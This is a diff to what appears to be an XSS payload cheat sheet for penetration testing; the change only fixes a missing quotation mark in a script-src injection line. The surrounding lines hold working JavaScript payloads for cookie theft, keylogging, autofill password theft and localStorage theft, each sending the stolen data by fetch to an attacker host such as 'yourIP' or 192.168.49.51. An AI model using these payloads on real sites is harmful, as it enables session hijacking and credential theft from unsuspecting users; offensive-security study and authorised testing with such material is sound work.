@@ -32,7 +32,7 @@
 		```
 		alert(1)
 		```
-		Then reference this payload in your initial injection point ie `<script src=http://yourip/xss.js"></script>`
+		Then reference this payload in your initial injection point ie `<script src="http://yourip/xss.js"></script>`
 * Cookie Stealer
 	* From an external source (python webserver):
 	<b>xss.js</b>
@@ -41,7 +41,7 @@
 		let encodedCookie = encodeURIComponent(cookie)
 		fetch("http://yourIP/exfil?data=" + encodedCookie)
 		```
-		Then reference this payload in your initial injection point ie `<script src=http://yourip/xss.js"></script>`
+		Then reference this payload in your initial injection point ie `<script src="http://yourip/xss.js"></script>`
 * Local Storage Secrets Stealer
 	* From an external source (python webserver):
 	<b>xss.js</b>
@@ -55,7 +55,7 @@
 		```function logKey(event){
 		fetch("http://yourIP/k?key=" + event.key)}
 		document.addEventListener('keydown', logKey);```
-	Then reference this payload in your initial injection point ie `<script src=http://yourip/xss.js"></script>`
+	Then reference this payload in your initial injection point ie `<script src="http://yourip/xss.js"></script>`
 
 * Stealing pw's from autofill prompts
 	* From an external source (python webserver):
@@ -77,7 +77,7 @@ let body = document.getElementsByTagName("body")[0]
            fetch("http://192.168.49.51/k?u=" + u.value + "&p=" + p.value)
     }, 5000);
 ```
-Then reference this payload in your initial injection point ie `<script src=http://yourip/xss.js"></script>`
+Then reference this payload in your initial injection point ie `<script src="http://yourip/xss.js"></script>`
 
 * All-in-one (Target all potential secrets if you dont know what you are after)
 	* From an external source (python webserver):
@@ -99,7 +99,7 @@ fetch(attacker + "?storage=" + ls)
 fetch(attacker + "?cookies=" + encodeURIComponent(document.cookie))
 ```
 	
-Then reference this payload in your initial injection point ie `<script src=http://yourip/xss.js"></script>`
+Then reference this payload in your initial injection point ie `<script src="http://yourip/xss.js"></script>`
 
 
 <b>Remember if any of your payloads don't seem to work, take any script code you want to run and place it in the browser console to verify it's working</b>
